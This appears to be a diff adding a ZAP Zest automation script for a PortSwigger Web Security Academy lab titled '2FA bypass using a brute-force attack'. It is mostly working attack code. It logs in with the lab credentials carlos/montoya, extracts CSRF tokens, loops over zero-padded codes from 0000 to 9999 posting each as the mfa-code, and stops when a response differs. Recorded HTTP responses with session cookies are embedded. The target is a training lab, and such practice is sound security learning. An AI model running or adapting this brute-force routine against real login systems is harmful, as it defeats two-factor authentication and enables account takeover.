@@ -1,0 +1,489 @@
+{
+  "about": "This is a Zest script. For more details about Zest visit https://github.com/zaproxy/zest/",
+  "zestVersion": "0.8",
+  "title": "test3.zst",
+  "description": "",
+  "prefix": "https://0ae2002603a306668094db77005f002c.web-security-academy.net",
+  "type": "StandAlone",
+  "parameters": {
+    "tokenStart": "{{",
+    "tokenEnd": "}}",
+    "tokens": {},
+    "elementType": "ZestVariables"
+  },
+  "statements": [
+    {
+      "set": {
+        "start": 0,
+        "end": 9999,
+        "step": 2,
+        "elementType": "ZestLoopTokenIntegerSet"
+      },
+      "statements": [
+        {
+          "rootExpression": {
+            "length": 1,
+            "approx": 0,
+            "variableName": "test3",
+            "not": false,
+            "elementType": "ZestExpressionLength"
+          },
+          "ifStatements": [
+            {
+              "replace": "^",
+              "replacement": "000",
+              "regex": true,
+              "caseExact": false,
+              "variableName": "test3",
+              "index": 0,
+              "enabled": true,
+              "elementType": "ZestAssignReplace"
+            }
+          ],
+          "elseStatements": [
+            {
+              "rootExpression": {
+                "length": 2,
+                "approx": 0,
+                "variableName": "test3",
+                "not": false,
+                "elementType": "ZestExpressionLength"
+              },
+              "ifStatements": [
+                {
+                  "replace": "^",
+                  "replacement": "00",
+                  "regex": true,
+                  "caseExact": false,
+                  "variableName": "test3",
+                  "index": 0,
+                  "enabled": true,
+                  "elementType": "ZestAssignReplace"
+                }
+              ],
+              "elseStatements": [
+                {
+                  "rootExpression": {
+                    "length": 3,
+                    "approx": 0,
+                    "variableName": "test3",
+                    "not": false,
+                    "elementType": "ZestExpressionLength"
+                  },
+                  "ifStatements": [
+                    {
+                      "replace": "^",
+                      "replacement": "0",
+                      "regex": true,
+                      "caseExact": false,
+                      "variableName": "test3",
+                      "index": 0,
+                      "enabled": true,
+                      "elementType": "ZestAssignReplace"
+                    }
+                  ],
+                  "elseStatements": [],
+                  "index": 6,
+                  "enabled": true,
+                  "elementType": "ZestConditional"
+                }
+              ],
+              "index": 4,
+              "enabled": true,
+              "elementType": "ZestConditional"
+            }
+          ],
+          "index": 1,
+          "enabled": true,
+          "elementType": "ZestConditional"
+        },
+        {
+          "url": "https://0ac2002704a8b8be80c3675b00ec0015.web-security-academy.net/login",
+          "data": "",
+          "method": "GET",
+          "headers": "DNT: 1\r\nUpgrade-Insecure-Requests: 1\r\nSec-Fetch-Dest: document\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Site: same-origin\r\nSec-Fetch-User: ?1\r\n",
+          "response": {
+            "url": "https://0a61007c043fda6880b2ad7f00cb005d.web-security-academy.net/login",
+            "headers": "HTTP/1.1 200 OK\nContent-Type: text/html; charset\u003dutf-8\nX-Frame-Options: SAMEORIGIN\nConnection: close\nContent-Length: 3154\n\n",
+            "body": "\u003c!DOCTYPE html\u003e\n\u003chtml\u003e\n    \u003chead\u003e\n        \u003clink href\u003d/resources/labheader/css/academyLabHeader.css rel\u003dstylesheet\u003e\n        \u003clink href\u003d/resources/css/labs.css rel\u003dstylesheet\u003e\n        \u003ctitle\u003e2FA bypass using a brute-force attack\u003c/title\u003e\n    \u003c/head\u003e\n    \u003cbody\u003e\n        \u003cscript src\u003d\"/resources/labheader/js/labHeader.js\"\u003e\u003c/script\u003e\n        \u003cdiv id\u003d\"academyLabHeader\"\u003e\n            \u003csection class\u003d\u0027academyLabBanner\u0027\u003e\n                \u003cdiv class\u003dcontainer\u003e\n                    \u003cdiv class\u003dlogo\u003e\u003c/div\u003e\n                        \u003cdiv class\u003dtitle-container\u003e\n                            \u003ch2\u003e2FA bypass using a brute-force attack\u003c/h2\u003e\n                            \u003ca class\u003dlink-back href\u003d\u0027https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-bypass-using-a-brute-force-attack\u0027\u003e\n                                Back\u0026nbsp;to\u0026nbsp;lab\u0026nbsp;description\u0026nbsp;\n                                \u003csvg version\u003d1.1 id\u003dLayer_1 xmlns\u003d\u0027http://www.w3.org/2000/svg\u0027 xmlns:xlink\u003d\u0027http://www.w3.org/1999/xlink\u0027 x\u003d0px y\u003d0px viewBox\u003d\u00270 0 28 30\u0027 enable-background\u003d\u0027new 0 0 28 30\u0027 xml:space\u003dpreserve title\u003dback-arrow\u003e\n                                    \u003cg\u003e\n                                        \u003cpolygon points\u003d\u00271.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15\u0027\u003e\u003c/polygon\u003e\n                                        \u003cpolygon points\u003d\u002714.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15\u0027\u003e\u003c/polygon\u003e\n                                    \u003c/g\u003e\n                                \u003c/svg\u003e\n                            \u003c/a\u003e\n                        \u003c/div\u003e\n                        \u003cdiv class\u003d\u0027widgetcontainer-lab-status is-notsolved\u0027\u003e\n                            \u003cspan\u003eLAB\u003c/span\u003e\n                            \u003cp\u003eNot solved\u003c/p\u003e\n                            \u003cspan class\u003dlab-status-icon\u003e\u003c/span\u003e\n                        \u003c/div\u003e\n                    \u003c/div\u003e\n                \u003c/div\u003e\n            \u003c/section\u003e\n        \u003c/div\u003e\n        \u003cdiv theme\u003d\"\"\u003e\n            \u003csection class\u003d\"maincontainer\"\u003e\n                \u003cdiv class\u003d\"container is-page\"\u003e\n                    \u003cheader class\u003d\"navigation-header\"\u003e\n                        \u003csection class\u003d\"top-links\"\u003e\n                            \u003ca href\u003d/\u003eHome\u003c/a\u003e\u003cp\u003e|\u003c/p\u003e\n                            \u003ca href\u003d\"/my-account\"\u003eMy account\u003c/a\u003e\u003cp\u003e|\u003c/p\u003e\n                        \u003c/section\u003e\n                    \u003c/header\u003e\n                    \u003cheader class\u003d\"notification-header\"\u003e\n                    \u003c/header\u003e\n                    \u003ch1\u003eLogin\u003c/h1\u003e\n                    \u003csection\u003e\n                        \u003cform class\u003dlogin-form method\u003dPOST action\u003d\"/login\"\u003e\n                            \u003cinput required type\u003d\"hidden\" name\u003d\"csrf\" value\u003d\"k3IFSvZarbztPrCztRgCDmezFpy1KXOX\"\u003e\n                            \u003clabel\u003eUsername\u003c/label\u003e\n                            \u003cinput required type\u003dusername name\u003d\"username\"\u003e\n                            \u003clabel\u003ePassword\u003c/label\u003e\n                            \u003cinput required type\u003dpassword name\u003d\"password\"\u003e\n                            \u003cbutton class\u003dbutton type\u003dsubmit\u003e Log in \u003c/button\u003e\n                        \u003c/form\u003e\n                    \u003c/section\u003e\n                \u003c/div\u003e\n            \u003c/section\u003e\n            \u003cdiv class\u003d\"footer-wrapper\"\u003e\n            \u003c/div\u003e\n        \u003c/div\u003e\n    \u003c/body\u003e\n\u003c/html\u003e\n",
+            "statusCode": 200,
+            "responseTimeInMs": 213,
+            "elementType": "ZestResponse"
+          },
+          "assertions": [
+            {
+              "rootExpression": {
+                "code": 200,
+                "not": false,
+                "elementType": "ZestExpressionStatusCode"
+              },
+              "elementType": "ZestAssertion"
+            }
+          ],
+          "followRedirects": false,
+          "timestamp": 1686497551111,
+          "cookies": [],
+          "index": 2,
+          "enabled": true,
+          "elementType": "ZestRequest"
+        },
+        {
+          "fieldDefinition": {
+            "formIndex": 0,
+            "fieldName": "csrf",
+            "elementType": "ZestFieldDefinition"
+          },
+          "variableName": "csrf1",
+          "index": 3,
+          "enabled": true,
+          "elementType": "ZestAssignFieldValue"
+        },
+        {
+          "url": "https://0ac2002704a8b8be80c3675b00ec0015.web-security-academy.net/login",
+          "data": "csrf\u003d{{csrf1}}\u0026username\u003dcarlos\u0026password\u003dmontoya",
+          "method": "POST",
+          "headers": "Content-Type: application/x-www-form-urlencoded\r\nContent-Length: 70\r\nOrigin: https://0a61007c043fda6880b2ad7f00cb005d.web-security-academy.net\r\nDNT: 1\r\nUpgrade-Insecure-Requests: 1\r\nSec-Fetch-Dest: document\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Site: same-origin\r\nSec-Fetch-User: ?1\r\n",
+          "response": {
+            "url": "https://0a61007c043fda6880b2ad7f00cb005d.web-security-academy.net/login",
+            "headers": "HTTP/1.1 302 Found\nLocation: /login2\nSet-Cookie: session\u003dTsXGjkOG3T4NHNlXoBvLI5CCGPE9Vpiw; Secure; HttpOnly; SameSite\u003dNone\nX-Frame-Options: SAMEORIGIN\nConnection: close\nContent-Length: 0\n\n",
+            "body": "",
+            "statusCode": 302,
+            "responseTimeInMs": 172,
+            "elementType": "ZestResponse"
+          },
+          "assertions": [
+            {
+              "rootExpression": {
+                "code": 302,
+                "not": false,
+                "elementType": "ZestExpressionStatusCode"
+              },
+              "elementType": "ZestAssertion"
+            }
+          ],
+          "followRedirects": false,
+          "timestamp": 1686497563613,
+          "cookies": [],
+          "index": 4,
+          "enabled": true,
+          "elementType": "ZestRequest"
+        },
+        {
+          "url": "https://0ac2002704a8b8be80c3675b00ec0015.web-security-academy.net/login2",
+          "data": "",
+          "method": "GET",
+          "headers": "DNT: 1\r\nUpgrade-Insecure-Requests: 1\r\nSec-Fetch-Dest: document\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Site: same-origin\r\nSec-Fetch-User: ?1\r\n",
+          "response": {
+            "url": "https://0a61007c043fda6880b2ad7f00cb005d.web-security-academy.net/login2",
+            "headers": "HTTP/1.1 200 OK\nContent-Type: text/html; charset\u003dutf-8\nX-Frame-Options: SAMEORIGIN\nConnection: close\nContent-Length: 3005\n\n",
+            "body": "\u003c!DOCTYPE html\u003e\n\u003chtml\u003e\n    \u003chead\u003e\n        \u003clink href\u003d/resources/labheader/css/academyLabHeader.css rel\u003dstylesheet\u003e\n        \u003clink href\u003d/resources/css/labs.css rel\u003dstylesheet\u003e\n        \u003ctitle\u003e2FA bypass using a brute-force attack\u003c/title\u003e\n    \u003c/head\u003e\n    \u003cbody\u003e\n        \u003cscript src\u003d\"/resources/labheader/js/labHeader.js\"\u003e\u003c/script\u003e\n        \u003cdiv id\u003d\"academyLabHeader\"\u003e\n            \u003csection class\u003d\u0027academyLabBanner\u0027\u003e\n                \u003cdiv class\u003dcontainer\u003e\n                    \u003cdiv class\u003dlogo\u003e\u003c/div\u003e\n                        \u003cdiv class\u003dtitle-container\u003e\n                            \u003ch2\u003e2FA bypass using a brute-force attack\u003c/h2\u003e\n                            \u003ca id\u003d\u0027lab-link\u0027 class\u003d\u0027button\u0027 href\u003d\u0027/\u0027\u003eBack to lab home\u003c/a\u003e\n                            \u003ca class\u003dlink-back href\u003d\u0027https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-bypass-using-a-brute-force-attack\u0027\u003e\n                                Back\u0026nbsp;to\u0026nbsp;lab\u0026nbsp;description\u0026nbsp;\n                                \u003csvg version\u003d1.1 id\u003dLayer_1 xmlns\u003d\u0027http://www.w3.org/2000/svg\u0027 xmlns:xlink\u003d\u0027http://www.w3.org/1999/xlink\u0027 x\u003d0px y\u003d0px viewBox\u003d\u00270 0 28 30\u0027 enable-background\u003d\u0027new 0 0 28 30\u0027 xml:space\u003dpreserve title\u003dback-arrow\u003e\n                                    \u003cg\u003e\n                                        \u003cpolygon points\u003d\u00271.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15\u0027\u003e\u003c/polygon\u003e\n                                        \u003cpolygon points\u003d\u002714.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15\u0027\u003e\u003c/polygon\u003e\n                                    \u003c/g\u003e\n                                \u003c/svg\u003e\n                            \u003c/a\u003e\n                        \u003c/div\u003e\n                        \u003cdiv class\u003d\u0027widgetcontainer-lab-status is-notsolved\u0027\u003e\n                            \u003cspan\u003eLAB\u003c/span\u003e\n                            \u003cp\u003eNot solved\u003c/p\u003e\n                            \u003cspan class\u003dlab-status-icon\u003e\u003c/span\u003e\n                        \u003c/div\u003e\n                    \u003c/div\u003e\n                \u003c/div\u003e\n            \u003c/section\u003e\n        \u003c/div\u003e\n        \u003cdiv theme\u003d\"\"\u003e\n            \u003csection class\u003d\"maincontainer\"\u003e\n                \u003cdiv class\u003d\"container is-page\"\u003e\n                    \u003cheader class\u003d\"navigation-header\"\u003e\n                        \u003csection class\u003d\"top-links\"\u003e\n                            \u003ca href\u003d/\u003eHome\u003c/a\u003e\u003cp\u003e|\u003c/p\u003e\n                            \u003ca href\u003d\"/my-account\"\u003eMy account\u003c/a\u003e\u003cp\u003e|\u003c/p\u003e\n                        \u003c/section\u003e\n                    \u003c/header\u003e\n                    \u003cheader class\u003d\"notification-header\"\u003e\n                    \u003c/header\u003e\n                    \u003cform class\u003dlogin-form method\u003dPOST\u003e\n                        \u003cinput required type\u003d\"hidden\" name\u003d\"csrf\" value\u003d\"eI5C9vCsTwtpHZ0njK01MyS7cOPE2PWu\"\u003e\n                        \u003clabel\u003ePlease enter your 4-digit security code\u003c/label\u003e\n                        \u003cinput required type\u003dtext name\u003dmfa-code\u003e\n                        \u003cbutton class\u003dbutton type\u003dsubmit\u003e Login \u003c/button\u003e\n                    \u003c/form\u003e\n                \u003c/div\u003e\n            \u003c/section\u003e\n            \u003cdiv class\u003d\"footer-wrapper\"\u003e\n            \u003c/div\u003e\n        \u003c/div\u003e\n    \u003c/body\u003e\n\u003c/html\u003e\n",
+            "statusCode": 200,
+            "responseTimeInMs": 313,
+            "elementType": "ZestResponse"
+          },
+          "assertions": [
+            {
+              "rootExpression": {
+                "code": 200,
+                "not": false,
+                "elementType": "ZestExpressionStatusCode"
+              },
+              "elementType": "ZestAssertion"
+            }
+          ],
+          "followRedirects": false,
+          "timestamp": 1686497563907,
+          "cookies": [],
+          "index": 5,
+          "enabled": true,
+          "elementType": "ZestRequest"
+        },
+        {
+          "fieldDefinition": {
+            "formIndex": 0,
+            "fieldName": "csrf",
+            "elementType": "ZestFieldDefinition"
+          },
+          "variableName": "csrf2",
+          "index": 6,
+          "enabled": true,
+          "elementType": "ZestAssignFieldValue"
+        },
+        {
+          "url": "https://0ac2002704a8b8be80c3675b00ec0015.web-security-academy.net/login2",
+          "data": "csrf\u003d{{csrf2}}\u0026mfa-code\u003d{{test3}}",
+          "method": "POST",
+          "headers": "Content-Type: application/x-www-form-urlencoded\r\nContent-Length: 51\r\nOrigin: https://0a61007c043fda6880b2ad7f00cb005d.web-security-academy.net\r\nDNT: 1\r\nUpgrade-Insecure-Requests: 1\r\nSec-Fetch-Dest: document\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Site: same-origin\r\nSec-Fetch-User: ?1\r\n",
+          "response": {
+            "url": "https://0a61007c043fda6880b2ad7f00cb005d.web-security-academy.net/login2",
+            "headers": "HTTP/1.1 200 OK\nContent-Type: text/html; charset\u003dutf-8\nX-Frame-Options: SAMEORIGIN\nConnection: close\nContent-Length: 3073\n\n",
+            "body": "\u003c!DOCTYPE html\u003e\n\u003chtml\u003e\n    \u003chead\u003e\n        \u003clink href\u003d/resources/labheader/css/academyLabHeader.css rel\u003dstylesheet\u003e\n        \u003clink href\u003d/resources/css/labs.css rel\u003dstylesheet\u003e\n        \u003ctitle\u003e2FA bypass using a brute-force attack\u003c/title\u003e\n    \u003c/head\u003e\n    \u003cbody\u003e\n        \u003cscript src\u003d\"/resources/labheader/js/labHeader.js\"\u003e\u003c/script\u003e\n        \u003cdiv id\u003d\"academyLabHeader\"\u003e\n            \u003csection class\u003d\u0027academyLabBanner\u0027\u003e\n                \u003cdiv class\u003dcontainer\u003e\n                    \u003cdiv class\u003dlogo\u003e\u003c/div\u003e\n                        \u003cdiv class\u003dtitle-container\u003e\n                            \u003ch2\u003e2FA bypass using a brute-force attack\u003c/h2\u003e\n                            \u003ca id\u003d\u0027lab-link\u0027 class\u003d\u0027button\u0027 href\u003d\u0027/\u0027\u003eBack to lab home\u003c/a\u003e\n                            \u003ca class\u003dlink-back href\u003d\u0027https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-bypass-using-a-brute-force-attack\u0027\u003e\n                                Back\u0026nbsp;to\u0026nbsp;lab\u0026nbsp;description\u0026nbsp;\n                                \u003csvg version\u003d1.1 id\u003dLayer_1 xmlns\u003d\u0027http://www.w3.org/2000/svg\u0027 xmlns:xlink\u003d\u0027http://www.w3.org/1999/xlink\u0027 x\u003d0px y\u003d0px viewBox\u003d\u00270 0 28 30\u0027 enable-background\u003d\u0027new 0 0 28 30\u0027 xml:space\u003dpreserve title\u003dback-arrow\u003e\n                                    \u003cg\u003e\n                                        \u003cpolygon points\u003d\u00271.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15\u0027\u003e\u003c/polygon\u003e\n                                        \u003cpolygon points\u003d\u002714.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15\u0027\u003e\u003c/polygon\u003e\n                                    \u003c/g\u003e\n                                \u003c/svg\u003e\n                            \u003c/a\u003e\n                        \u003c/div\u003e\n                        \u003cdiv class\u003d\u0027widgetcontainer-lab-status is-notsolved\u0027\u003e\n                            \u003cspan\u003eLAB\u003c/span\u003e\n                            \u003cp\u003eNot solved\u003c/p\u003e\n                            \u003cspan class\u003dlab-status-icon\u003e\u003c/span\u003e\n                        \u003c/div\u003e\n                    \u003c/div\u003e\n                \u003c/div\u003e\n            \u003c/section\u003e\n        \u003c/div\u003e\n        \u003cdiv theme\u003d\"\"\u003e\n            \u003csection class\u003d\"maincontainer\"\u003e\n                \u003cdiv class\u003d\"container is-page\"\u003e\n                    \u003cheader class\u003d\"navigation-header\"\u003e\n                        \u003csection class\u003d\"top-links\"\u003e\n                            \u003ca href\u003d/\u003eHome\u003c/a\u003e\u003cp\u003e|\u003c/p\u003e\n                            \u003ca href\u003d\"/my-account\"\u003eMy account\u003c/a\u003e\u003cp\u003e|\u003c/p\u003e\n                        \u003c/section\u003e\n                    \u003c/header\u003e\n                    \u003cheader class\u003d\"notification-header\"\u003e\n                    \u003c/header\u003e\n                    \u003cform class\u003dlogin-form method\u003dPOST\u003e\n                        \u003cinput required type\u003d\"hidden\" name\u003d\"csrf\" value\u003d\"eI5C9vCsTwtpHZ0njK01MyS7cOPE2PWu\"\u003e\n                    \u003cp class\u003dis-warning\u003eIncorrect security code\u003c/p\u003e\n                        \u003clabel\u003ePlease enter your 4-digit security code\u003c/label\u003e\n                        \u003cinput required type\u003dtext name\u003dmfa-code\u003e\n                        \u003cbutton class\u003dbutton type\u003dsubmit\u003e Login \u003c/button\u003e\n                    \u003c/form\u003e\n                \u003c/div\u003e\n            \u003c/section\u003e\n            \u003cdiv class\u003d\"footer-wrapper\"\u003e\n            \u003c/div\u003e\n        \u003c/div\u003e\n    \u003c/body\u003e\n\u003c/html\u003e\n",
+            "statusCode": 200,
+            "responseTimeInMs": 208,
+            "elementType": "ZestResponse"
+          },
+          "assertions": [],
+          "followRedirects": false,
+          "timestamp": 1686497569815,
+          "cookies": [],
+          "index": 7,
+          "enabled": true,
+          "elementType": "ZestRequest"
+        },
+        {
+          "rootExpression": {
+            "code": 200,
+            "not": false,
+            "elementType": "ZestExpressionStatusCode"
+          },
+          "ifStatements": [],
+          "elseStatements": [
+            {
+              "url": "https://0ac2002704a8b8be80c3675b00ec0015.web-security-academy.net/my-account",
+              "data": "",
+              "method": "GET",
+              "headers": "DNT: 1\r\nUpgrade-Insecure-Requests: 1\r\nSec-Fetch-Dest: document\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Site: same-origin\r\nSec-Fetch-User: ?1\r\n",
+              "response": {
+                "url": "https://0a4a00c20459b27582df383d0022002e.web-security-academy.net/my-account",
+                "headers": "HTTP/1.1 302 Found\nLocation: /login\nX-Frame-Options: SAMEORIGIN\nConnection: close\nContent-Length: 0\n\n",
+                "body": "",
+                "statusCode": 302,
+                "responseTimeInMs": 225,
+                "elementType": "ZestResponse"
+              },
+              "assertions": [
+                {
+                  "rootExpression": {
+                    "code": 302,
+                    "not": false,
+                    "elementType": "ZestExpressionStatusCode"
+                  },
+                  "elementType": "ZestAssertion"
+                },
+                {
+                  "rootExpression": {
+                    "length": 0,
+                    "approx": 1,
+                    "variableName": "response.body",
+                    "not": false,
+                    "elementType": "ZestExpressionLength"
+                  },
+                  "elementType": "ZestAssertion"
+                }
+              ],
+              "followRedirects": false,
+              "timestamp": 1686664874167,
+              "cookies": [],
+              "index": 9,
+              "enabled": true,
+              "elementType": "ZestRequest"
+            },
+            {
+              "index": 0,
+              "enabled": true,
+              "elementType": "ZestControlLoopBreak"
+            }
+          ],
+          "index": 8,
+          "enabled": true,
+          "elementType": "ZestConditional"
+        },
+        {
+          "operandA": "{{test3}}",
+          "operandB": "1",
+          "operation": "add",
+          "variableName": "test3",
+          "index": 1,
+          "enabled": true,
+          "elementType": "ZestAssignCalc"
+        },
+        {
+          "rootExpression": {
+            "length": 1,
+            "approx": 0,
+            "variableName": "test3",
+            "not": false,
+            "elementType": "ZestExpressionLength"
+          },
+          "ifStatements": [
+            {
+              "replace": "^",
+              "replacement": "000",
+              "regex": true,
+              "caseExact": false,
+              "variableName": "test3",
+              "index": 2,
+              "enabled": true,
+              "elementType": "ZestAssignReplace"
+            }
+          ],
+          "elseStatements": [
+            {
+              "rootExpression": {
+                "length": 2,
+                "approx": 0,
+                "variableName": "test3",
+                "not": false,
+                "elementType": "ZestExpressionLength"
+              },
+              "ifStatements": [
+                {
+                  "replace": "^",
+                  "replacement": "00",
+                  "regex": true,
+                  "caseExact": false,
+                  "variableName": "test3",
+                  "index": 3,
+                  "enabled": true,
+                  "elementType": "ZestAssignReplace"
+                }
+              ],
+              "elseStatements": [
+                {
+                  "rootExpression": {
+                    "length": 3,
+                    "approx": 0,
+                    "variableName": "test3",
+                    "not": false,
+                    "elementType": "ZestExpressionLength"
+                  },
+                  "ifStatements": [
+                    {
+                      "replace": "^",
+                      "replacement": "0",
+                      "regex": true,
+                      "caseExact": false,
+                      "variableName": "test3",
+                      "index": 4,
+                      "enabled": true,
+                      "elementType": "ZestAssignReplace"
+                    }
+                  ],
+                  "elseStatements": [],
+                  "index": 6,
+                  "enabled": true,
+                  "elementType": "ZestConditional"
+                }
+              ],
+              "index": 4,
+              "enabled": true,
+              "elementType": "ZestConditional"
+            }
+          ],
+          "index": 10,
+          "enabled": true,
+          "elementType": "ZestConditional"
+        },
+        {
+          "fieldDefinition": {
+            "formIndex": 0,
+            "fieldName": "csrf",
+            "elementType": "ZestFieldDefinition"
+          },
+          "variableName": "csrf3",
+          "index": 5,
+          "enabled": true,
+          "elementType": "ZestAssignFieldValue"
+        },
+        {
+          "url": "https://0ac2002704a8b8be80c3675b00ec0015.web-security-academy.net/login2",
+          "data": "csrf\u003d{{csrf3}}\u0026mfa-code\u003d{{test3}}",
+          "method": "POST",
+          "headers": "Content-Type: application/x-www-form-urlencoded\r\nContent-Length: 51\r\nOrigin: https://0a61007c043fda6880b2ad7f00cb005d.web-security-academy.net\r\nDNT: 1\r\nUpgrade-Insecure-Requests: 1\r\nSec-Fetch-Dest: document\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Site: same-origin\r\nSec-Fetch-User: ?1\r\n",
+          "response": {
+            "url": "https://0a61007c043fda6880b2ad7f00cb005d.web-security-academy.net/login2",
+            "headers": "HTTP/1.1 200 OK\nContent-Type: text/html; charset\u003dutf-8\nSet-Cookie: session\u003doZYEhi3lns1f3JuKtsDQpH35Wllwasyi; Secure; HttpOnly; SameSite\u003dNone\nX-Frame-Options: SAMEORIGIN\nConnection: close\nContent-Length: 3316\n\n",
+            "body": "\u003c!DOCTYPE html\u003e\n\u003chtml\u003e\n    \u003chead\u003e\n        \u003clink href\u003d/resources/labheader/css/academyLabHeader.css rel\u003dstylesheet\u003e\n        \u003clink href\u003d/resources/css/labs.css rel\u003dstylesheet\u003e\n        \u003ctitle\u003e2FA bypass using a brute-force attack\u003c/title\u003e\n    \u003c/head\u003e\n    \u003cbody\u003e\n        \u003cscript src\u003d\"/resources/labheader/js/labHeader.js\"\u003e\u003c/script\u003e\n        \u003cdiv id\u003d\"academyLabHeader\"\u003e\n            \u003csection class\u003d\u0027academyLabBanner\u0027\u003e\n                \u003cdiv class\u003dcontainer\u003e\n                    \u003cdiv class\u003dlogo\u003e\u003c/div\u003e\n                        \u003cdiv class\u003dtitle-container\u003e\n                            \u003ch2\u003e2FA bypass using a brute-force attack\u003c/h2\u003e\n                            \u003ca id\u003d\u0027lab-link\u0027 class\u003d\u0027button\u0027 href\u003d\u0027/\u0027\u003eBack to lab home\u003c/a\u003e\n                            \u003ca class\u003dlink-back href\u003d\u0027https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-bypass-using-a-brute-force-attack\u0027\u003e\n                                Back\u0026nbsp;to\u0026nbsp;lab\u0026nbsp;description\u0026nbsp;\n                                \u003csvg version\u003d1.1 id\u003dLayer_1 xmlns\u003d\u0027http://www.w3.org/2000/svg\u0027 xmlns:xlink\u003d\u0027http://www.w3.org/1999/xlink\u0027 x\u003d0px y\u003d0px viewBox\u003d\u00270 0 28 30\u0027 enable-background\u003d\u0027new 0 0 28 30\u0027 xml:space\u003dpreserve title\u003dback-arrow\u003e\n                                    \u003cg\u003e\n                                        \u003cpolygon points\u003d\u00271.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15\u0027\u003e\u003c/polygon\u003e\n                                        \u003cpolygon points\u003d\u002714.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15\u0027\u003e\u003c/polygon\u003e\n                                    \u003c/g\u003e\n                                \u003c/svg\u003e\n                            \u003c/a\u003e\n                        \u003c/div\u003e\n                        \u003cdiv class\u003d\u0027widgetcontainer-lab-status is-notsolved\u0027\u003e\n                            \u003cspan\u003eLAB\u003c/span\u003e\n                            \u003cp\u003eNot solved\u003c/p\u003e\n                            \u003cspan class\u003dlab-status-icon\u003e\u003c/span\u003e\n                        \u003c/div\u003e\n                    \u003c/div\u003e\n                \u003c/div\u003e\n            \u003c/section\u003e\n        \u003c/div\u003e\n        \u003cdiv theme\u003d\"\"\u003e\n            \u003csection class\u003d\"maincontainer\"\u003e\n                \u003cdiv class\u003d\"container is-page\"\u003e\n                    \u003cheader class\u003d\"navigation-header\"\u003e\n                        \u003csection class\u003d\"top-links\"\u003e\n                            \u003ca href\u003d/\u003eHome\u003c/a\u003e\u003cp\u003e|\u003c/p\u003e\n                            \u003ca href\u003d\"/my-account\"\u003eMy account\u003c/a\u003e\u003cp\u003e|\u003c/p\u003e\n                        \u003c/section\u003e\n                    \u003c/header\u003e\n                    \u003cheader class\u003d\"notification-header\"\u003e\n                    \u003c/header\u003e\n                    \u003ch1\u003eLogin\u003c/h1\u003e\n                    \u003csection\u003e\n                        \u003cp class\u003dis-warning\u003eIncorrect security code\u003c/p\u003e\n                        \u003cform class\u003dlogin-form method\u003dPOST action\u003d\"/login\"\u003e\n                            \u003cinput required type\u003d\"hidden\" name\u003d\"csrf\" value\u003d\"Fb1D4p4cRTB0PhNdwVEIQ7UzjF3VXFbs\"\u003e\n                            \u003clabel\u003eUsername\u003c/label\u003e\n                            \u003cinput required type\u003dusername name\u003d\"username\"\u003e\n                            \u003clabel\u003ePassword\u003c/label\u003e\n                            \u003cinput required type\u003dpassword name\u003d\"password\"\u003e\n                            \u003cbutton class\u003dbutton type\u003dsubmit\u003e Log in \u003c/button\u003e\n                        \u003c/form\u003e\n                    \u003c/section\u003e\n                \u003c/div\u003e\n            \u003c/section\u003e\n            \u003cdiv class\u003d\"footer-wrapper\"\u003e\n            \u003c/div\u003e\n        \u003c/div\u003e\n    \u003c/body\u003e\n\u003c/html\u003e\n",
+            "statusCode": 200,
+            "responseTimeInMs": 169,
+            "elementType": "ZestResponse"
+          },
+          "assertions": [],
+          "followRedirects": false,
+          "timestamp": 1686497575449,
+          "cookies": [],
+          "index": 6,
+          "enabled": true,
+          "elementType": "ZestRequest"
+        },
+        {
+          "rootExpression": {
+            "code": 200,
+            "not": false,
+            "elementType": "ZestExpressionStatusCode"
+          },
+          "ifStatements": [],
+          "elseStatements": [
+            {
+              "url": "https://0ac2002704a8b8be80c3675b00ec0015.web-security-academy.net/my-account",
+              "data": "",
+              "method": "GET",
+              "headers": "DNT: 1\r\nUpgrade-Insecure-Requests: 1\r\nSec-Fetch-Dest: document\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Site: same-origin\r\nSec-Fetch-User: ?1\r\n",
+              "response": {
+                "url": "https://0a4a00c20459b27582df383d0022002e.web-security-academy.net/my-account",
+                "headers": "HTTP/1.1 302 Found\nLocation: /login\nX-Frame-Options: SAMEORIGIN\nConnection: close\nContent-Length: 0\n\n",
+                "body": "",
+                "statusCode": 302,
+                "responseTimeInMs": 225,
+                "elementType": "ZestResponse"
+              },
+              "assertions": [
+                {
+                  "rootExpression": {
+                    "code": 302,
+                    "not": false,
+                    "elementType": "ZestExpressionStatusCode"
+                  },
+                  "elementType": "ZestAssertion"
+                },
+                {
+                  "rootExpression": {
+                    "length": 0,
+                    "approx": 1,
+                    "variableName": "response.body",
+                    "not": false,
+                    "elementType": "ZestExpressionLength"
+                  },
+                  "elementType": "ZestAssertion"
+                }
+              ],
+              "followRedirects": false,
+              "timestamp": 1686664874167,
+              "cookies": [],
+              "index": 14,
+              "enabled": true,
+              "elementType": "ZestRequest"
+            },
+            {
+              "index": 7,
+              "enabled": true,
+              "elementType": "ZestControlLoopBreak"
+            }
+          ],
+          "index": 13,
+          "enabled": true,
+          "elementType": "ZestConditional"
+        },
+        {
+          "fieldDefinition": {
+            "formIndex": 0,
+            "fieldName": "csrf",
+            "elementType": "ZestFieldDefinition"
+          },
+          "variableName": "csrf4",
+          "index": 8,
+          "enabled": true,
+          "elementType": "ZestAssignFieldValue"
+        }
+      ],
+      "variableName": "test3",
+      "index": 1,
+      "enabled": true,
+      "elementType": "ZestLoopInteger"
+    }
+  ],
+  "authentication": [],
+  "index": 0,
+  "enabled": true,
+  "elementType": "ZestScript"
+}
